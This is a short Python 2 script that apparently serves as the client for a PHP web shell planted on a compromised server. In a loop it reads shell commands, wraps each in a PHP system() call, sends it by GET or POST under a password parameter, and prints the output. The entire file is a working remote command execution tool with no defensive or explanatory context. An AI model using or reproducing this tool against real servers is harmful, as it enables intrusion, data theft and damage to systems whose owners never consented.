import requests

def rce(address,password,method):
	while 1:
		command = raw_input('Command(Input stop to exit):')
		if command == 'stop':
			break
		if method == 'get':
			print "*******************************************************" 
			try:
				data = {password:"system('"+command+"');"}
				r = requests.get(address,params=data)
				if r.text != '':
					print address,":"
					print r.text
					print "*******************************************************" 
			except:
				print "Rce Failed."
				print "*******************************************************" 
		if method == 'post':
			print "*******************************************************" 
			try:
				data = {password:"system('"+command+"');"}
				r = requests.post(address,data=data)
				if r.text != '':
					print address,":"
					print r.text
					print "*******************************************************" 
			except:
				print "Rce Failed."
				print "*******************************************************"
